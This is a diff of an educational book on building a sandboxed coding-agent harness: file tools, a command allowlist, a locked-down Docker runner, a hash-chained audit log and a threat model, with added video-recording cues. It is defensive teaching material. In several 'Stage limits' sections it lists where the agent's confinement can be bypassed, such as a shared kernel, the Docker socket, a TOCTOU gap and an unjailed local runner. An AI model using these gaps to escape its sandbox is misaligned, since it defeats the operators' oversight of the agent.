 ERROR[TOO_LARGE]: content is 2000 bytes; limit is 1024
 ERROR[IS_DIR]: refusing to delete a folder</pre></figure>
 <p><code>run_tool</code> catches <code>SandboxError</code>, <code>KeyError</code>-style argument mistakes and unexpected exceptions. A bug in a tool is labelled <code>INTERNAL</code> and does not kill the session. The traceback belongs in the server log, not in the model's context.</p>
-</section>
-<section id="s32">
-<h2><span class="num">32</span><span>Run it</span></h2>
+<h3 id="s04-04">Run it</h3>
 <p>From <code>ch02/</code>:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python -m mini_harness.demo
 python -m pytest -v</pre></figure>
 <p>The demo performs normal work and then four refusals. The exact observation strings are what a model would see.</p>
-</section>
-<section id="s33">
-<h2><span class="num">33</span><span>It works when</span></h2>
+<div class="callout"><p><strong>Demo beat:</strong> 🧪 Show one successful write, then <code>TOO_LARGE</code>, <code>EXISTS</code>, <code>AMBIGUOUS</code>, and <code>PATH</code> in that order. End on the fact that no traceback reaches the model.</p></div>
+<div class="callout"><p><strong>Audience question:</strong> 🗣️ &quot;Why not just catch the exception and return the traceback?&quot; Answer: a traceback is noisy context and can leak host paths. A stable error code is a contract the model can act on.</p></div>
+<h3 id="s04-05">It works when</h3>
 <ul>
 <li>[ ] <code>read_text</code> returns the file, preserves <code>\r\n</code>, and refuses a directory.</li>
 <li>[ ] A read over the limit returns <code>TOO_LARGE</code>.</li>
@@ -615,18 +611,15 @@ python -m pytest -v</pre></figure>
 <li>[ ] An escape returns <code>ERROR[PATH]</code>, not a traceback.</li>
 <li>[ ] The symlink-write test skips on a machine that cannot create symlinks.</li>
 </ul>
-</section>
-<section id="s34">
-<h2><span class="num">34</span><span>Stage limits</span></h2>
+<h3 id="s04-06">Stage limits</h3>
 <ul>
 <li>Still the same user on the same kernel. A command tool would be able to bypass the sandbox entirely.</li>
 <li>Still a time-of-check/time-of-use gap between policy and open.</li>
 <li>No command execution yet.</li>
 <li>No audit trail yet.</li>
 </ul>
-</section>
-<section id="s35">
-<h2><span class="num">35</span><span>If it goes wrong</span></h2>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ These limits protect the agent process from oversized results. They do not protect the host from a command. Stage 3 adds a runner, and Stage 4 makes the runner live behind a real boundary.</p></div>
+<h3 id="s04-07">If it goes wrong</h3>
 <ul>
 <li><strong>An edit changes the wrong text</strong> — check that the unique-match default is active and that <code>count=0</code> is only used deliberately.</li>
 <li><strong>A write succeeds but the file is empty</strong> — check that the temp file is flushed and fsynced before <code>os.replace</code>, and that the bytes are written before the handle closes.</li>
@@ -634,9 +627,7 @@ python -m pytest -v</pre></figure>
 <li><strong>Windows says the temp file is in use</strong> — an open handle usually means the writer raised before <code>os.replace</code>. The cleanup path removes it; check the <code>IO</code> message for the underlying error.</li>
 <li><strong>A symlink read looks like a normal file</strong> — that is correct: reading through a symlink is allowed when the resolved target is inside the root. A write through a final symlink is refused.</li>
 </ul>
-</section>
-<section id="s36">
-<h2><span class="num">36</span><span>Read next</span></h2>
+<h3 id="s04-08">Read next</h3>
 <ul>
 <li><code>../plan.md</code> Stage 2</li>
 <li><code>../THREAT_MODEL.md</code> — resource exhaustion and file-write threats</li>
@@ -644,13 +635,11 @@ python -m pytest -v</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s37">
-<h2><span class="num">37</span><span>Chapter 3 — Stage 3: Running code locally</span></h2>
+<section id="s05">
+<h2><span class="num">05</span><span>Chapter 3 — Stage 3: Running code locally</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.</p></div>
 <p><strong>Book:</strong> Stage 3, &quot;Running code locally&quot; <strong>Plan:</strong> Stage 3 <strong>Goal:</strong> Execute a command through an argv allowlist with a clean environment, a timeout, a process-tree kill and bounded output.</p>
-</section>
-<section id="s38">
-<h2><span class="num">38</span><span>The problem</span></h2>
+<h3 id="s05-01">The problem</h3>
 <p>The moment a coding agent can run a command, the sandbox story changes. File tools are a small set of operations; a process is a general-purpose escape hatch. The first version of a command tool is usually:</p>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>subprocess.run(user_string, shell=True)</pre></figure>
 <p>That single line gives the model:</p>
@@ -663,27 +652,24 @@ python -m pytest -v</pre></figure>
 <li>the same filesystem and network access as the agent process.</li>
 </ul>
 <p>Stage 3 removes the easy accidents. It does <strong>not</strong> claim to be a jail.</p>
-</section>
-<section id="s39">
-<h2><span class="num">39</span><span>What changed</span></h2>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Build the episode around one sentence: &quot;Hygiene is not a boundary.&quot; Every control is a hygiene improvement; the final demo proves the boundary is still missing.</p></div>
+<h3 id="s05-02">What changed</h3>
 <ul>
 <li>Added <code>mini_harness/local_runner.py</code> with <code>CommandRunner</code>, <code>Limits</code>, <code>CommandPolicy</code> and <code>CommandResult</code>.</li>
 <li>Added <code>mini_harness/command_tool.py</code> with the model-facing <code>run_command</code> observation shape.</li>
 <li>Added <code>mini_harness/demo.py</code> and <code>tests/test_local_runner.py</code>.</li>
 </ul>
-</section>
-<section id="s40">
-<h2><span class="num">40</span><span>The seven controls</span></h2>
-<h3 id="s40-01">1. Argv, not a string</h3>
+<h3 id="s05-03">The seven controls</h3>
+<h4 id="s05-03-01">1. Argv, not a string</h4>
 <p><code>CommandRunner.run(&quot;python&quot;, [&quot;-c&quot;, &quot;print('hi')&quot;])</code> takes a program and a list of arguments. Passing a single string is rejected. There is no <code>shell=True</code> path in the runner.</p>
 <p>A semicolon inside an argument is an ordinary character:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>python -c &quot;print('a;b')&quot;   -&gt;  a;b</pre></figure>
 <p>There is no second command to start.</p>
-<h3 id="s40-02">2. An absolute-path allowlist</h3>
+<h4 id="s05-03-02">2. An absolute-path allowlist</h4>
 <p><code>CommandPolicy</code> maps a logical name to an absolute executable:</p>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>{&quot;python&quot;: sys.executable}</pre></figure>
 <p>The runner does not use <code>shutil.which</code> for model-supplied names. A file called <code>python</code> dropped into the workspace cannot shadow the interpreter through <code>PATH</code>. The allowlist is checked again at call time; a missing executable is an <code>IO</code> error, not a fallback to <code>PATH</code>.</p>
-<h3 id="s40-03">3. A clean environment</h3>
+<h4 id="s05-03-03">3. A clean environment</h4>
 <p><code>_clean_environment</code> starts from an empty dict and adds only:</p>
 <ul>
 <li>OS-essential variables (<code>SYSTEMROOT</code>, <code>WINDIR</code>, <code>COMSPEC</code>, <code>PATHEXT</code>, <code>LANG</code>, <code>LC_ALL</code>);</li>
@@ -692,17 +678,17 @@ python -m pytest -v</pre></figure>
 <li>deterministic Python flags.</li>
 </ul>
 <p>A sentinel secret in the parent environment does not appear in the child. The test asserts that directly.</p>
-<h3 id="s40-04">4. A timeout with a process-tree kill</h3>
+<h4 id="s05-03-04">4. A timeout with a process-tree kill</h4>
 <p>The child is started in a new session (POSIX) or a new process group (Windows). On timeout the runner kills the <strong>group</strong>:</p>
 <ul>
 <li>POSIX: <code>os.killpg(os.getpgid(pid), SIGKILL)</code>;</li>
 <li>Windows: <code>taskkill /F /T /PID</code>.</li>
 </ul>
 <p>Killing only the direct child would leave grandchildren running.</p>
-<h3 id="s40-05">5. Output caps that still drain</h3>
+<h4 id="s05-03-05">5. Output caps that still drain</h4>
 <p>Two background threads read stdout and stderr in 8 KiB chunks. Once the cap is reached the bytes are discarded but the pipe keeps being read. If the parent stopped reading, the child would block on a full pipe and never exit, turning an output limit into a hang.</p>
 <p>The observation always says when output was truncated.</p>
-<h3 id="s40-06">6. POSIX resource limits</h3>
+<h4 id="s05-03-06">6. POSIX resource limits</h4>
 <p>Before <code>exec</code>, the child lowers:</p>
 <ul>
 <li><code>RLIMIT_CPU</code> — CPU seconds;</li>
@@ -712,25 +698,22 @@ python -m pytest -v</pre></figure>
 <li><code>RLIMIT_NPROC</code> — process count (where supported).</li>
 </ul>
 <p>Failures are swallowed: an unsupported limit should not stop a legitimate command. On Windows there is no Python-level equivalent here; the book uses container limits in Stage 4 instead. Do not pretend the local runner is equivalent on both platforms.</p>
-<h3 id="s40-07">7. A workspace-relative working directory</h3>
+<h4 id="s05-03-07">7. A workspace-relative working directory</h4>
 <p><code>cwd</code> goes through the same path policy as reads. The model cannot ask to run from the user's home folder. A missing or non-directory cwd is a <code>CWD</code> refusal.</p>
-</section>
-<section id="s41">
-<h2><span class="num">41</span><span>What the demo proves, honestly</span></h2>
+<h3 id="s05-04">What the demo proves, honestly</h3>
 <p>The final demo command reads a file <strong>outside</strong> the workspace:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>local runner is not a filesystem jail
   OK ... outside data</pre></figure>
 <p>That is not a bug in Stage 3. It is the motivation for Stage 4. Hygiene is not a boundary.</p>
-</section>
-<section id="s42">
-<h2><span class="num">42</span><span>Run it</span></h2>
+<div class="callout"><p><strong>Demo beat:</strong> 🧪 End the episode on this exact output. Stop talking, let the outside read land, then say: &quot;That is why Stage 4 exists.&quot; Cut to black.</p></div>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Never describe the local runner as a sandbox on camera. Call it a guardrail or accident prevention. The child still has the same filesystem and network access as the agent process.</p></div>
+<h3 id="s05-05">Run it</h3>
 <p>From <code>ch03/</code>:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python -m mini_harness.demo
 python -m pytest -v</pre></figure>
 <p>The tests use the running Python interpreter as the only allowlisted program, so they need no network and no shell. pytest is the sole test dependency.</p>
-</section>
-<section id="s43">
-<h2><span class="num">43</span><span>It works when</span></h2>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Put the <code>CommandPolicy</code> mapping on screen when you explain the allowlist. A logical name that resolves to one absolute executable is easier to grasp than a paragraph about <code>PATH</code>.</p></div>
+<h3 id="s05-06">It works when</h3>
 <ul>
 <li>[ ] A normal Python command returns stdout and exit code 0.</li>
 <li>[ ] stderr is captured separately.</li>
@@ -743,18 +726,14 @@ python -m pytest -v</pre></figure>
 <li>[ ] <code>cwd=&quot;../..&quot;</code> returns <code>CWD</code>.</li>
 <li>[ ] On POSIX, the child sees the requested <code>RLIMIT_CPU</code> (test may skip on Windows).</li>
 </ul>
-</section>
-<section id="s44">
-<h2><span class="num">44</span><span>Stage limits</span></h2>
+<h3 id="s05-07">Stage limits</h3>
 <ul>
 <li>Same user, same filesystem, same network. The child can read anything the user can read and connect to anything the user can connect to.</li>
 <li><code>preexec_fn</code> is used for rlimits. It is only safe here because the runner executes one command at a time and starts no threads before <code>fork</code>. A concurrent server should use <code>posix_spawn</code> or a supervisor.</li>
 <li>The allowlist applies to the <strong>direct</strong> program. That program can spawn helpers. The container is what limits that.</li>
 <li>Windows has no rlimits in this chapter. The Docker chapter is the portable boundary.</li>
 </ul>
-</section>
-<section id="s45">
-<h2><span class="num">45</span><span>If it goes wrong</span></h2>
+<h3 id="s05-08">If it goes wrong</h3>
 <ul>
 <li>**<code>DENIED</code> for a program that exists** — add its absolute path to the <code>CommandPolicy</code> mapping. Do not switch to <code>shutil.which</code> for model input.</li>
 <li><strong>The timeout takes longer than expected on Windows</strong> — <code>taskkill /T</code> walks the process tree and can take a moment. The test uses a generous bound.</li>
@@ -762,9 +741,7 @@ python -m pytest -v</pre></figure>
 <li>**<code>RLIMIT_AS</code> breaks a legitimate Python start** — the memory cap is applied to the interpreter too. Raise <code>memory_mb</code> deliberately and record why.</li>
 <li>**<code>preexec_fn</code> warnings** — do not call this runner from multiple threads in a larger application without redesigning child setup.</li>
 </ul>
-</section>
-<section id="s46">
-<h2><span class="num">46</span><span>Read next</span></h2>
+<h3 id="s05-09">Read next</h3>
 <ul>
 <li><code>../plan.md</code> Stage 3</li>
 <li><code>../THREAT_MODEL.md</code> — command execution and resource exhaustion</li>
@@ -772,27 +749,22 @@ python -m pytest -v</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s47">
-<h2><span class="num">47</span><span>Chapter 4 — Stage 4: Docker as the real wall</span></h2>
+<section id="s06">
+<h2><span class="num">06</span><span>Chapter 4 — Stage 4: Docker as the real wall</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.</p></div>
 <p><strong>Book:</strong> Stage 4, &quot;Docker as the real wall&quot; <strong>Plan:</strong> Stage 4 <strong>Goal:</strong> Run one argv command inside a no-network, no-capability, resource-limited container with a read-only root and a single workspace bind mount.</p>
-</section>
-<section id="s48">
-<h2><span class="num">48</span><span>The problem</span></h2>
+<h3 id="s06-01">The problem</h3>
 <p>Stage 3 is good hygiene, not a boundary. The local runner and the agent run as the same user on the same kernel. A command can read the user's SSH keys, write to the user's home folder, or open a network connection. Timeouts and rlimits limit how much damage happens; they do not decide <strong>what</strong> is reachable.</p>
 <p>Docker adds a kernel-backed boundary: namespaces, cgroups, capabilities, a seccomp profile and a separate filesystem view. It is still not magic — a container shares the host kernel — but it is a much better default than &quot;same process, same user, same filesystem&quot;.</p>
-</section>
-<section id="s49">
-<h2><span class="num">49</span><span>What changed</span></h2>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Start with the three things the Stage 3 child can still do: read SSH keys, write to the home folder, open a network connection. Then introduce the container as the control for reachability, not just time.</p></div>
+<h3 id="s06-02">What changed</h3>
 <ul>
 <li>Added <code>docker/Dockerfile</code> and <code>docker/.dockerignore</code>.</li>
 <li>Added <code>mini_harness/docker_runner.py</code> with <code>DockerRunner</code>, <code>DockerConfig</code> and <code>RunResult</code>.</li>
 <li>Added <code>mini_harness/demo.py</code> and <code>tests/test_docker_runner.py</code>.</li>
 <li>The tests assert the <strong>exact</strong> <code>docker run</code> flags without needing a daemon.</li>
 </ul>
-</section>
-<section id="s50">
-<h2><span class="num">50</span><span>The image contract</span></h2>
+<h3 id="s06-03">The image contract</h3>
 <figure class="code"><figcaption><span>dockerfile</span><span class="lang">dockerfile</span></figcaption><pre>FROM python:3.12-slim-bookworm
 RUN groupadd --gid 1000 sandbox \
     &amp;&amp; useradd --uid 1000 --gid sandbox --create-home \
@@ -810,9 +782,7 @@ CMD [&quot;python&quot;, &quot;-c&quot;, &quot;print('mini-harness sandbox image
 <p>Build from <code>ch04/</code>:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>docker build -t mini-harness-python:latest docker</pre></figure>
 <p>Pin the base image by digest in a real deployment. &quot;latest&quot; is convenient for a book and dangerous for production.</p>
-</section>
-<section id="s51">
-<h2><span class="num">51</span><span>The run contract</span></h2>
+<h3 id="s06-04">The run contract</h3>
 <p>Every flag below is a deliberate decision. The tests fail if one disappears.</p>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Flag</th><th style="text-align:left">Why it is there</th></tr></thead>
@@ -838,30 +808,24 @@ CMD [&quot;python&quot;, &quot;-c&quot;, &quot;print('mini-harness sandbox image
 <tr><td style="text-align:left"><code>--init</code></td><td style="text-align:left">A tiny init reaps orphaned grandchildren inside the container.</td></tr>
 </tbody></table></div>
 <p>Docker's default seccomp profile still applies. The runner does not pass <code>--privileged</code>, does not mount the Docker socket, and does not add devices.</p>
-</section>
-<section id="s52">
-<h2><span class="num">52</span><span>The important subtlety: read-only root is not read-only workspace</span></h2>
+<div class="callout"><p><strong>Pro tip:</strong> 💡 Put the flag table on screen as a banner while the command runs. Focus on <code>--network none</code>, <code>--read-only</code>, <code>--privileged</code> absence, <code>--pids-limit</code>, and the single workspace mount. Do not read every row aloud.</p></div>
+<h3 id="s06-05">The important subtlety: read-only root is not read-only workspace</h3>
 <p><code>--read-only</code> freezes the <strong>image</strong> filesystem. The bind mount at <code>/workspace</code> is still writable when <code>workspace_mode=&quot;rw&quot;</code>. That is intentional: a coding agent must edit files. The boundary is &quot;only this folder is writable&quot;, not &quot;nothing is writable&quot;.</p>
 <p>If a task only needs to read, use:</p>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>DockerConfig(workspace_mode=&quot;ro&quot;)</pre></figure>
 <p>Then even the workspace is immutable inside the container, and the host file tools remain the only way to change it.</p>
-</section>
-<section id="s53">
-<h2><span class="num">53</span><span>Timeout cleanup</span></h2>
+<h3 id="s06-06">Timeout cleanup</h3>
 <p><code>docker run --rm</code> removes the container when it exits. If the command hangs, the Python runner must <strong>also</strong> remove the container, because killing the <code>docker</code> CLI process does not necessarily stop the daemon-side container. The runner calls:</p>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>docker rm -f &lt;container-name&gt;</pre></figure>
 <p>then kills the CLI process. The unique name makes this safe.</p>
-</section>
-<section id="s54">
-<h2><span class="num">54</span><span>Run it</span></h2>
+<h3 id="s06-07">Run it</h3>
 <p>From <code>ch04/</code>:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python -m mini_harness.demo
 python -m mini_harness.demo --build
 python -m pytest -v</pre></figure>
 <p>The first command prints the full <code>docker run</code> argv even when Docker is not installed. The integration tests skip when the daemon or image is missing.</p>
-</section>
-<section id="s55">
-<h2><span class="num">55</span><span>It works when</span></h2>
+<div class="callout"><p><strong>Demo beat:</strong> 🧪 Show the full argv first, then run the four live behaviours: Python runs, the network fails, a root write fails, and the workspace is visible. Keep each result on screen for a beat before moving on.</p></div>
+<h3 id="s06-08">It works when</h3>
 <ul>
 <li>[ ] The command contains <code>--network none</code>, <code>--read-only</code>, <code>--cap-drop ALL</code>, <code>--security-opt no-new-privileges</code>, <code>--pids-limit</code>, <code>--memory</code>, <code>--memory-swap</code>, <code>--cpus</code>, <code>--ulimit</code>, <code>--user</code>, <code>--workdir</code>, <code>--tmpfs</code>, <code>--volume</code>, <code>--ipc none</code> and <code>--init</code>.</li>
 <li>[ ] There is exactly one <code>--volume</code>, and it ends in <code>:/workspace:rw</code>.</li>
@@ -872,9 +836,7 @@ python -m pytest -v</pre></figure>
 <li>[ ] A configuration with <code>network=&quot;bridge&quot;</code> or <code>read_only_root=False</code> is refused.</li>
 <li>[ ] With Docker and the image present: Python runs, the network fails, the root filesystem refuses a write, and the workspace is visible.</li>
 </ul>
-</section>
-<section id="s56">
-<h2><span class="num">56</span><span>Stage limits</span></h2>
+<h3 id="s06-09">Stage limits</h3>
 <ul>
 <li>A container shares the host kernel. Kernel exploits and Docker daemon compromise are outside this boundary.</li>
 <li>The Docker socket is extremely powerful. Never mount it into the sandbox.</li>
@@ -883,9 +845,8 @@ python -m pytest -v</pre></figure>
 <li>Bind-mount permissions depend on the host user and Docker's user mapping. <code>--user 1000:1000</code> may not be able to write on a host where the workspace is owned by a different uid. This is a deployment decision, not a bug.</li>
 <li><code>--network none</code> blocks network access inside the container; it does not stop the Docker daemon, the host, or a sibling container.</li>
 </ul>
-</section>
-<section id="s57">
-<h2><span class="num">57</span><span>If it goes wrong</span></h2>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ Never mount the Docker socket into the sandbox, never add <code>--privileged</code>, and never demonstrate a write outside the workspace. The container is a boundary, but a bad flag is a hole in it.</p></div>
+<h3 id="s06-10">If it goes wrong</h3>
 <ul>
 <li>**<code>docker: command not found</code>** — install Docker Desktop/Engine and start it. The unit tests still run; only the integration tests skip.</li>
 <li>**<code>Cannot connect to the Docker daemon</code>** — start Docker Desktop or the <code>docker</code> service. <code>check_available()</code> uses <code>docker version</code> for this reason.</li>
@@ -894,9 +855,7 @@ python -m pytest -v</pre></figure>
 <li><strong>The container is still present after a timeout</strong> — check that the unique <code>--name</code> was passed and that <code>docker rm -f</code> has permission to talk to the daemon.</li>
 <li><strong>A command that needs a writable cache fails</strong> — do not make the root writable. Add a small, explicit tmpfs at the path the tool needs, or set <code>HOME</code>/<code>TMP</code> to <code>/tmp</code>.</li>
 </ul>
-</section>
-<section id="s58">
-<h2><span class="num">58</span><span>Read next</span></h2>
+<h3 id="s06-11">Read next</h3>
 <ul>
 <li><code>../plan.md</code> Stage 4</li>
 <li><code>../OPERATIONS.md</code> — image updates, daemon security and incident response</li>
@@ -904,13 +863,11 @@ python -m pytest -v</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s59">
-<h2><span class="num">59</span><span>Chapter 5 — Stage 5: The finished harness</span></h2>
+<section id="s07">
+<h2><span class="num">07</span><span>Chapter 5 — Stage 5: The finished harness</span></h2>
 <div class="callout"><p><strong>Educational use only — not a production-ready system.</strong> This chapter is part of an educational project to learn and understand. It deliberately simplifies design, error handling, security, and operations so the core idea stays visible. Do not deploy this code as-is.</p></div>
 <p><strong>Book:</strong> Stage 5, &quot;The finished harness&quot; <strong>Plan:</strong> Stage 5 <strong>Goal:</strong> Wire the path policy, file sandbox, Docker runner and an append-only audit log into one small agent loop, then prove it end to end without an API key.</p>
-</section>
-<section id="s60">
-<h2><span class="num">60</span><span>The problem</span></h2>
+<h3 id="s07-01">The problem</h3>
 <p>At the end of Stage 4 we have two good boundaries and no product:</p>
 <ul>
 <li>file tools that enforce a path policy;</li>
@@ -924,9 +881,8 @@ python -m pytest -v</pre></figure>
 <li>a <code>ScriptedModel</code> and CLI so the whole thing runs offline and in CI.</li>
 </ol>
 <p>The absence of an LLM client is deliberate. The book is about the sandbox, not about choosing a provider. A real adapter implements one method and everything else stays the same.</p>
-</section>
-<section id="s61">
-<h2><span class="num">61</span><span>What changed</span></h2>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Open with the two boundaries already built, then ask: &quot;What is missing?&quot; The answer is not another control. It is the loop and the record.</p></div>
+<h3 id="s07-02">What changed</h3>
 <ul>
 <li>Added <code>mini_harness/toolbox.py</code> — one dispatch point for all tools.</li>
 <li>Added <code>mini_harness/docker_tools.py</code> — the model-facing command tool.</li>
@@ -935,9 +891,7 @@ python -m pytest -v</pre></figure>
 <li>Added <code>mini_harness/cli.py</code> and <code>__main__.py</code> — the offline demo.</li>
 <li>Added <code>tests/test_toolbox.py</code>, <code>test_agent.py</code>, <code>test_audit.py</code> and <code>test_cli.py</code>.</li>
 </ul>
-</section>
-<section id="s62">
-<h2><span class="num">62</span><span>The toolbox</span></h2>
+<h3 id="s07-03">The toolbox</h3>
 <p>The toolbox is intentionally thin:</p>
 <figure class="code"><figcaption><span>python</span><span class="lang">python</span></figcaption><pre>if name == &quot;run_command&quot;:
     return run_command_tool(self.runner, arguments)
@@ -951,9 +905,7 @@ return f&quot;ERROR[UNKNOWN_TOOL]: no tool named {name!r}&quot;</pre></figure>
 <li>the toolbox only routes by name.</li>
 </ul>
 <p>A new file tool appears in <code>FILE_TOOL_NAMES</code> automatically because the set is derived from <code>file_tools.TOOL_SPECS</code>. A new command tool would add one branch and one spec.</p>
-</section>
-<section id="s63">
-<h2><span class="num">63</span><span>The loop</span></h2>
+<h3 id="s07-04">The loop</h3>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>messages = [user task]
 for step in 1..max_steps:
     reply = model(messages, tools)
@@ -966,10 +918,9 @@ return &quot;stopped after max_steps&quot;</pre></figure>
 <li><strong>The step limit is in the loop, not the model.</strong> A model can loop forever; the harness cannot.</li>
 <li><strong>A refusal is an observation, not an exception.</strong> The model sees <code>ERROR[PATH]</code> or <code>ERROR[DOCKER_MISSING]</code> and can choose a different action. The loop continues.</li>
 </ul>
+<div class="callout"><p><strong>Audience question:</strong> 🗣️ &quot;Why not let the model decide when to stop?&quot; Answer: a model may loop forever; the harness may not. The step limit belongs to the loop.</p></div>
 <p><code>AgentResult</code> returns the final text, the step count, the stop reason, the full transcript and a compact list of observations. A UI can render the transcript; a test can assert on the observations.</p>
-</section>
-<section id="s64">
-<h2><span class="num">64</span><span>The audit log</span></h2>
+<h3 id="s07-05">The audit log</h3>
 <p><code>AuditLog</code> writes one JSON object per line:</p>
 <figure class="code"><figcaption><span>json</span><span class="lang">json</span></figcaption><pre>{&quot;ts&quot;:&quot;...&quot;,&quot;seq&quot;:1,&quot;action&quot;:&quot;tool.call&quot;,&quot;outcome&quot;:&quot;requested&quot;,
  &quot;detail&quot;:{&quot;tool&quot;:&quot;read_file&quot;,&quot;args&quot;:{&quot;path&quot;:&quot;hello.py&quot;}},
@@ -982,9 +933,7 @@ return &quot;stopped after max_steps&quot;</pre></figure>
 <li><strong>Redacted.</strong> Keys matching <code>key|token|secret|password|credential</code> are written as <code>***REDACTED***</code>; long values are truncated.</li>
 </ul>
 <p>The audit records <code>agent.start</code>, <code>tool.call</code>, <code>tool.result</code>, <code>agent.final</code> and <code>agent.max_steps</code>. The <code>tool.result</code> observation is clipped in the log but kept in full in the transcript.</p>
-</section>
-<section id="s65">
-<h2><span class="num">65</span><span>The scripted demo</span></h2>
+<h3 id="s07-06">The scripted demo</h3>
 <p>From <code>ch05/</code>:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>python -m mini_harness
 python -m mini_harness --build
@@ -1000,9 +949,8 @@ python -m pytest -v</pre></figure>
 <p>If Docker is missing, step 3 returns:</p>
 <figure class="code"><figcaption><span>text</span><span class="lang">text</span></figcaption><pre>ERROR[DOCKER_MISSING]: Docker CLI/daemon is not available</pre></figure>
 <p>The loop still finishes. That is the desired behaviour: infrastructure absence is a visible failed tool call, not a crash.</p>
-</section>
-<section id="s66">
-<h2><span class="num">66</span><span>End-to-end acceptance</span></h2>
+<div class="callout"><p><strong>Demo beat:</strong> 🧪 Show the write, the read, the container run, the final answer, and <code>audit chain verifies: True</code>. Then open the JSONL and point at <code>seq</code>, <code>prev</code>, and <code>hash</code> in one event. That is the proof, not the claim.</p></div>
+<h3 id="s07-07">End-to-end acceptance</h3>
 <p>Run these in order on a machine with Docker and the image built:</p>
 <figure class="code"><figcaption><span>bash</span><span class="lang">bash</span></figcaption><pre>cd ch04 &amp;&amp; python -m mini_harness.demo --build
 cd ../ch05 &amp;&amp; python -m mini_harness --build
@@ -1016,9 +964,7 @@ python -m pytest -v</pre></figure>
 <li>[ ] The CLI's temporary workspace is cleaned up when the process exits.</li>
 <li>[ ] All chapter test suites pass; Docker integration tests skip cleanly on a machine without a daemon or image.</li>
 </ul>
-</section>
-<section id="s67">
-<h2><span class="num">67</span><span>Stage limits</span></h2>
+<h3 id="s07-08">Stage limits</h3>
 <p>This is a teaching harness, not a production service. It still lacks:</p>
 <ul>
 <li>a real LLM adapter, retries, token accounting and streaming;</li>
@@ -1029,9 +975,8 @@ python -m pytest -v</pre></figure>
 <li>an image update pipeline and vulnerability scanning.</li>
 </ul>
 <p>Those are operations concerns. <code>../OPERATIONS.md</code> explains where they attach to this code without changing the boundaries.</p>
-</section>
-<section id="s68">
-<h2><span class="num">68</span><span>If it goes wrong</span></h2>
+<div class="callout"><p><strong>Recording cue:</strong> 🎬 Close the series on the audit line, then a title card: &quot;The boundary is the product.&quot; Keep the final take under 20 seconds and resist the urge to recap every chapter.</p></div>
+<h3 id="s07-09">If it goes wrong</h3>
 <ul>
 <li>**<code>ModuleNotFoundError: mini_harness</code>** — run from the chapter directory: <code>cd ch05 &amp;&amp; python -m mini_harness</code>. The package lives beside the chapter, not in a global environment.</li>
 <li>**<code>audit chain verifies: False</code>** — do not keep appending. Inspect <code>audit/events.jsonl</code>; a malformed or edited line breaks the chain. Restore a known-good copy and investigate.</li>
@@ -1040,9 +985,8 @@ python -m pytest -v</pre></figure>
 <li>**The container command reports <code>ERROR[EXIT]</code> with a permission error** — check the workspace mount and <code>--user</code> mapping. The file tools may have written a file owned by the host user that the container uid cannot edit.</li>
 <li><strong>Audit logging slows the demo</strong> — fsync on every event is deliberate. Batch or buffer only with a clear durability trade-off; do not silently drop the trail.</li>
 </ul>
-</section>
-<section id="s69">
-<h2><span class="num">69</span><span>Read next</span></h2>
+<div class="callout warn"><p><strong>Alert:</strong> ⚠️ This is a teaching harness, not a production service. Say so in the episode. The audit makes tampering visible; it does not make tampering impossible, and it is not a compliance control.</p></div>
+<h3 id="s07-10">Read next</h3>
 <ul>
 <li><code>../plan.md</code> Stage 5</li>
 <li><code>../OPERATIONS.md</code> — the runbook</li>
@@ -1051,12 +995,10 @@ python -m pytest -v</pre></figure>
 </ul>
 <hr>
 </section>
-<section id="s70">
-<h2><span class="num">70</span><span>Threat model</span></h2>
+<section id="s08">
+<h2><span class="num">08</span><span>Threat model</span></h2>
 <p>This document describes what the mini Python coding harness is trying to protect, who might attack it, and which control is supposed to stop each attack. It is deliberately smaller than a platform threat model. Read it with the chapters; a control without a test is a wish, and a test without a stated asset is noise.</p>
-</section>
-<section id="s71">
-<h2><span class="num">71</span><span>1. Assets</span></h2>
+<h3 id="s08-01">1. Assets</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Asset</th><th style="text-align:left">Why it matters</th></tr></thead>
 <tbody>
@@ -1069,9 +1011,7 @@ python -m pytest -v</pre></figure>
 <tr><td style="text-align:left">The sandbox image and daemon</td><td style="text-align:left">A compromised image or daemon defeats the boundary</td></tr>
 <tr><td style="text-align:left">The user's trust</td><td style="text-align:left">A silent bad edit or a leaked secret is worse than a visible refusal</td></tr>
 </tbody></table></div>
-</section>
-<section id="s72">
-<h2><span class="num">72</span><span>2. Actors and assumptions</span></h2>
+<h3 id="s08-02">2. Actors and assumptions</h3>
 <div class="table-wrap"><table>
 <thead><tr><th style="text-align:left">Actor</th><th style="text-align:left">Capability</th><th style="text-align:left">Assumption</th></tr></thead>
 <tbody>
@@ -1083,9 +1023,7 @@ python -m pytest -v</pre></figure>
